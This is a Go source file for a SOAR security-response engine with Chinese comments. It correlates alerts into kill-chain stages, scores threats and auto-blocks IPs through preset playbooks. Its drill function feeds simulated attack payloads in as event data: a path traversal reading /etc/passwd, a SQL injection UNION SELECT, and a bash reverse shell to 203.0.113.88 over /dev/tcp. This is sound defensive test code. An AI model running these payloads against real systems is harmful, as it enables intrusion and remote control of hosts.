package soar

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"sync"
	"time"
)

// KillChainStage 洛克希德·马丁网络杀伤链阶段
type KillChainStage string

const (
	StageRecon          KillChainStage = "RECONNAISSANCE"     // 侦察扫描阶段
	StageExploit        KillChainStage = "EXPLOITATION"       // 漏洞利用与入侵突破
	StagePrivEscalation KillChainStage = "PRIVILEGE_ESCALATE" // 权限提升与持久化后门
	StageLateralMove    KillChainStage = "LATERAL_MOVEMENT"   // 横向渗透与边界跨越
	StageExfiltration   KillChainStage = "DATA_EXFILTRATION"  // 核心数据窃取与破坏
)

// SecurityIncident 智能告警聚合与攻击链关联事件
type SecurityIncident struct {
	ID               string           `json:"id"`
	SourceIP         string           `json:"source_ip"`
	Target           string           `json:"target"`
	Stages           []KillChainStage `json:"stages"`
	EventCount       int              `json:"event_count"`
	ComponentsSeen   []string         `json:"components_seen"`
	ThreatScore      int              `json:"threat_score"` // 0 - 100
	Status           string           `json:"status"`       // "DETECTED", "CONTAINING", "CONTAINED"
	MitigationAction string           `json:"mitigation_action"`
	TriggeredRule    string           `json:"triggered_rule"`
	FirstSeen        time.Time        `json:"first_seen"`
	LastSeen         time.Time        `json:"last_seen"`
	DigitalSignature string           `json:"digital_signature"` // SHA-256 / SM3 存证签名
}

// Playbook 自动化响应编排剧本
type Playbook struct {
	ID             string `json:"id"`
	Name           string `json:"name"`
	Description    string `json:"description"`
	TriggerStage   string `json:"trigger_stage"`
	ActionType     string `json:"action_type"`
	TargetSystem   string `json:"target_system"`
	AutoMitigate   bool   `json:"auto_mitigate"`
	Enabled        bool   `json:"enabled"`
	ExecutionCount int    `json:"execution_count"`
}

// BlockedIPEntry 全网联动封禁池条目
type BlockedIPEntry struct {
	IP          string    `json:"ip"`
	Reason      string    `json:"reason"`
	PlaybookID  string    `json:"playbook_id"`
	IncidentID  string    `json:"incident_id"`
	BlockedAt   time.Time `json:"blocked_at"`
	ExpiresAt   time.Time `json:"expires_at"`
	Active      bool      `json:"active"`
	UnblockedBy string    `json:"unblocked_by,omitempty"`
}

// SOAREngine 安全编排自动化与协同联动响应引擎
type SOAREngine struct {
	mu         sync.RWMutex
	incidents  map[string]*SecurityIncident // sourceIP -> incident
	blockedIPs map[string]*BlockedIPEntry   // ip -> entry
	playbooks  map[string]*Playbook
}

// NewSOAREngine 初始化 SOAR 引擎与内置等保三级自动联动剧本
func NewSOAREngine() *SOAREngine {
	engine := &SOAREngine{
		incidents:  make(map[string]*SecurityIncident),
		blockedIPs: make(map[string]*BlockedIPEntry),
		playbooks:  make(map[string]*Playbook),
	}

	// 预置等保 2.0 联动防御剧本
	engine.registerDefaultPlaybooks()
	engine.initPresetData()
	return engine
}

func (e *SOAREngine) registerDefaultPlaybooks() {
	playbooks := []*Playbook{
		{
			ID:             "PB-APT-01",
			Name:           "多维攻击链全网阻断剧本 (APT Containment)",
			Description:    "当同一来源在短时间内跨 2 个以上安全组件触发高危告警时，判定为定向 APT 突破，自动联动云防火墙执行跨域阻断并拉黑 IP。",
			TriggerStage:   "CROSS_COMPONENT_CORRELATION",
			ActionType:     "CFW_ZONE_ISOLATION_AND_IP_DROP",
			TargetSystem:   "ALINKSEC-CFW & ALINKSEC-WAF",
			AutoMitigate:   true,
			Enabled:        true,
			ExecutionCount: 14,
		},
		{
			ID:             "PB-RCE-02",
			Name:           "反弹 Shell 提权秒级隔离剧本 (Host Isolation)",
			Description:    "当 EDR 检测到交互式反弹 Shell 或后门提权行为，判定威胁分 95+，自动联动主机 EDR 阻断进程并通知云防火墙切断该节点外部连接。",
			TriggerStage:   "PRIVILEGE_ESCALATE",
			ActionType:     "EDR_PROCESS_KILL_AND_NETWORK_ISOLATE",
			TargetSystem:   "ALINKSEC-EDR & ALINKSEC-CFW",
			AutoMitigate:   true,
			Enabled:        true,
			ExecutionCount: 9,
		},
		{
			ID:             "PB-DBA-03",
			Name:           "核心数据高危破坏熔断剧本 (Database Circuit Breaker)",
			Description:    "当数据库审计检测到 DROP/TRUNCATE 恶意删表或注入提权，立即下发指令切断异常会话并自动生成等保紧急工单。",
			TriggerStage:   "DATA_EXFILTRATION",
			ActionType:     "DB_SESSION_TERMINATE_AND_LOCK",
			TargetSystem:   "ALINKSEC-DBAUDIT",
			AutoMitigate:   true,
			Enabled:        true,
			ExecutionCount: 6,
		},
		{
			ID:             "PB-4A-04",
			Name:           "4A 运维越权高危阻断剧本 (Bastion Lockdown)",
			Description:    "当运维人员尝试执行全盘删除或窃取系统凭据等高危黑名单指令，立即挂起会话并锁定操作人凭据，触发双人授权核验。",
			TriggerStage:   "PRIVILEGE_ESCALATE",
			ActionType:     "BASTION_SESSION_FREEZE_AND_2FA_REQUIRE",
			TargetSystem:   "ALINKSEC-BASTION",
			AutoMitigate:   true,
			Enabled:        true,
			ExecutionCount: 3,
		},
	}

	for _, pb := range playbooks {
		e.playbooks[pb.ID] = pb
	}
}

func (e *SOAREngine) initPresetData() {
	now := time.Now()

	// 预置演练事件 1: 多阶段 APT 攻击链已处置
	inc1 := &SecurityIncident{
		ID:               "INC-20261024-001",
		SourceIP:         "198.51.100.88",
		Target:           "DMZ-WebServer -> APP-OrderSvc",
		Stages:           []KillChainStage{StageRecon, StageExploit, StageLateralMove},
		EventCount:       5,
		ComponentsSeen:   []string{"WAF", "CFW", "EDR"},
		ThreatScore:      92,
		Status:           "CONTAINED",
		MitigationAction: "PB-APT-01: CFW 联动下发全网阻断规则，拉黑 IP 24 小时",
		TriggeredRule:    "CROSS_COMPONENT_CORRELATION",
		FirstSeen:        now.Add(-45 * time.Minute),
		LastSeen:         now.Add(-40 * time.Minute),
	}
	inc1.DigitalSignature = e.computeIncidentSignature(inc1)
	e.incidents[inc1.SourceIP] = inc1

	// 预置封禁 IP
	e.blockedIPs["198.51.100.88"] = &BlockedIPEntry{
		IP:         "198.51.100.88",
		Reason:     "触发多维攻击链 (WAF SQL 注入 + CFW 跨域探测)",
		PlaybookID: "PB-APT-01",
		IncidentID: "INC-20261024-001",
		BlockedAt:  now.Add(-40 * time.Minute),
		ExpiresAt:  now.Add(23*time.Hour + 20*time.Minute),
		Active:     true,
	}

	// 预置演练事件 2: 数据库勒索删表阻断
	inc2 := &SecurityIncident{
		ID:               "INC-20261024-002",
		SourceIP:         "172.18.0.45",
		Target:           "DATA-MySQL-Master (users 表)",
		Stages:           []KillChainStage{StageExfiltration},
		EventCount:       2,
		ComponentsSeen:   []string{"DBAUDIT"},
		ThreatScore:      96,
		Status:           "CONTAINED",
		MitigationAction: "PB-DBA-03: DBAudit 熔断连接并生成等保紧急存证工单",
		TriggeredRule:    "HIGH_RISK_DDL_DROP_TRUNCATE",
		FirstSeen:        now.Add(-2 * time.Hour),
		LastSeen:         now.Add(-2 * time.Hour),
	}
	inc2.DigitalSignature = e.computeIncidentSignature(inc2)
	e.incidents[inc2.SourceIP] = inc2

	e.blockedIPs["172.18.0.45"] = &BlockedIPEntry{
		IP:         "172.18.0.45",
		Reason:     "尝试执行 DROP TABLE 核心数据表勒索删除",
		PlaybookID: "PB-DBA-03",
		IncidentID: "INC-20261024-002",
		BlockedAt:  now.Add(-2 * time.Hour),
		ExpiresAt:  now.Add(22 * time.Hour),
		Active:     true,
	}
}

func (e *SOAREngine) computeIncidentSignature(inc *SecurityIncident) string {
	payload := fmt.Sprintf("%s|%s|%s|%d|%d|%s", inc.ID, inc.SourceIP, inc.Target, inc.ThreatScore, inc.EventCount, inc.Status)
	hash := sha256.Sum256([]byte(payload))
	return hex.EncodeToString(hash[:])
}

// IngestSecurityEvent 摄取安全事件并执行攻击链关联分析
func (e *SOAREngine) IngestSecurityEvent(component string, sourceIP string, threatType string, severity string, payload string) (*SecurityIncident, string) {
	e.mu.Lock()
	defer e.mu.Unlock()

	if sourceIP == "" {
		sourceIP = "127.0.0.1"
	}

	inc, exists := e.incidents[sourceIP]
	now := time.Now()

	stage := e.mapThreatToStage(component, threatType)

	if !exists {
		inc = &SecurityIncident{
			ID:             fmt.Sprintf("INC-%s-%03d", now.Format("20060102"), len(e.incidents)+1),
			SourceIP:       sourceIP,
			Target:         "Internal-Services",
			Stages:         []KillChainStage{stage},
			EventCount:     1,
			ComponentsSeen: []string{component},
			ThreatScore:    e.calcInitialScore(severity),
			Status:         "DETECTED",
			FirstSeen:      now,
			LastSeen:       now,
		}
	} else {
		inc.EventCount++
		inc.LastSeen = now

		// 添加阶段（去重）
		hasStage := false
		for _, s := range inc.Stages {
			if s == stage {
				hasStage = true
				break
			}
		}
		if !hasStage {
			inc.Stages = append(inc.Stages, stage)
		}

		// 添加组件（去重）
		hasComp := false
		for _, c := range inc.ComponentsSeen {
			if c == component {
				hasComp = true
				break
			}
		}
		if !hasComp {
			inc.ComponentsSeen = append(inc.ComponentsSeen, component)
		}

		// 多组件协同加权算分
		inc.ThreatScore += 15
		if len(inc.ComponentsSeen) >= 2 {
			inc.ThreatScore += 25
		}
		if inc.ThreatScore > 100 {
			inc.ThreatScore = 100
		}
	}

	// 匹配与执行自动化剧本
	actionTaken := e.evaluateAndExecutePlaybooks(inc)
	inc.DigitalSignature = e.computeIncidentSignature(inc)
	e.incidents[sourceIP] = inc

	return inc, actionTaken
}

func (e *SOAREngine) mapThreatToStage(component string, threatType string) KillChainStage {
	switch component {
	case "WAF":
		if threatType == "DIR_TRAVERSAL" || threatType == "SCANNER_PROBE" {
			return StageRecon
		}
		return StageExploit
	case "CFW":
		return StageLateralMove
	case "EDR":
		return StagePrivEscalation
	case "DBAUDIT":
		return StageExfiltration
	case "BASTION":
		return StagePrivEscalation
	default:
		return StageExploit
	}
}

func (e *SOAREngine) calcInitialScore(severity string) int {
	switch severity {
	case "CRITICAL":
		return 85
	case "HIGH":
		return 70
	case "MEDIUM":
		return 50
	default:
		return 30
	}
}

func (e *SOAREngine) evaluateAndExecutePlaybooks(inc *SecurityIncident) string {
	now := time.Now()

	// 剧本 1: 跨组件 APT 突破阻断
	if len(inc.ComponentsSeen) >= 2 || inc.ThreatScore >= 85 {
		if pb, ok := e.playbooks["PB-APT-01"]; ok && pb.Enabled {
			pb.ExecutionCount++
			inc.Status = "CONTAINED"
			inc.MitigationAction = "PB-APT-01: 智能 SOAR 自动联动云防火墙与 WAF，已全网封禁源 IP 并隔离会话"
			inc.TriggeredRule = "CROSS_COMPONENT_CORRELATION"

			e.blockedIPs[inc.SourceIP] = &BlockedIPEntry{
				IP:         inc.SourceIP,
				Reason:     fmt.Sprintf("SOAR 自动化封禁: 攻击链威胁评分 %d, 跨 %d 个组件渗透", inc.ThreatScore, len(inc.ComponentsSeen)),
				PlaybookID: pb.ID,
				IncidentID: inc.ID,
				BlockedAt:  now,
				ExpiresAt:  now.Add(24 * time.Hour),
				Active:     true,
			}
			return inc.MitigationAction
		}
	}

	// 剧本 2: 严重高分威胁
	if inc.ThreatScore >= 70 {
		inc.Status = "CONTAINING"
		inc.MitigationAction = "自动化警报派发，通知管理员执行人工核实并启动高危监控"
		return inc.MitigationAction
	}

	return "常规威胁已记录，持续追踪后续动作"
}

// GetIncidents 获取当前所有攻击链关联事件列表
func (e *SOAREngine) GetIncidents() []*SecurityIncident {
	e.mu.RLock()
	defer e.mu.RUnlock()

	result := make([]*SecurityIncident, 0, len(e.incidents))
	for _, inc := range e.incidents {
		result = append(result, inc)
	}
	return result
}

// GetBlockedIPs 获取封禁 IP 池列表
func (e *SOAREngine) GetBlockedIPs() []*BlockedIPEntry {
	e.mu.RLock()
	defer e.mu.RUnlock()

	result := make([]*BlockedIPEntry, 0, len(e.blockedIPs))
	for _, item := range e.blockedIPs {
		result = append(result, item)
	}
	return result
}

// UnblockIP 解封 IP
func (e *SOAREngine) UnblockIP(ip string, adminUser string) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	entry, ok := e.blockedIPs[ip]
	if !ok {
		return fmt.Errorf("ip %s 不在封禁列表中", ip)
	}

	entry.Active = false
	entry.UnblockedBy = adminUser
	entry.ExpiresAt = time.Now()

	// 若存在关联 incident，更新状态
	if inc, found := e.incidents[ip]; found {
		inc.Status = "RESOLVED"
		inc.MitigationAction = fmt.Sprintf("已由管理员 %s 手工解除联动封禁", adminUser)
		inc.DigitalSignature = e.computeIncidentSignature(inc)
	}

	return nil
}

// GetPlaybooks 获取所有剧本
func (e *SOAREngine) GetPlaybooks() []*Playbook {
	e.mu.RLock()
	defer e.mu.RUnlock()

	result := make([]*Playbook, 0, len(e.playbooks))
	for _, pb := range e.playbooks {
		result = append(result, pb)
	}
	return result
}

// TogglePlaybook 启用/禁用剧本
func (e *SOAREngine) TogglePlaybook(id string, enabled bool) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	pb, ok := e.playbooks[id]
	if !ok {
		return fmt.Errorf("playbook %s 不存在", id)
	}
	pb.Enabled = enabled
	return nil
}

// RunMultiStageDrill 触发多阶段 APT 实弹协同联动攻防测试
func (e *SOAREngine) RunMultiStageDrill(drillIP string) *SecurityIncident {
	if drillIP == "" {
		drillIP = fmt.Sprintf("203.0.113.%d", time.Now().Unix()%200+10)
	}

	// 阶段 1: WAF 目录扫描探测 (RECONNAISSANCE)
	e.IngestSecurityEvent("WAF", drillIP, "DIR_TRAVERSAL", "MEDIUM", "GET /../../etc/passwd HTTP/1.1")

	// 阶段 2: WAF SQL 注入漏洞利用 (EXPLOITATION)
	e.IngestSecurityEvent("WAF", drillIP, "SQL_INJECTION", "HIGH", "admin' UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata--")

	// 阶段 3: CFW 违规微隔离跨域横向探测 (LATERAL_MOVEMENT)
	e.IngestSecurityEvent("CFW", drillIP, "ZONE_BOUNDARY_CROSSING", "CRITICAL", "DMZ direct TCP 3306 connection to DATA zone bypassed APP")

	// 阶段 4: EDR 检测到反弹 Shell (PRIVILEGE_ESCALATE)
	inc, _ := e.IngestSecurityEvent("EDR", drillIP, "REVERSE_SHELL", "CRITICAL", "/bin/bash -i >& /dev/tcp/203.0.113.88/4444 0>&1")

	return inc
}
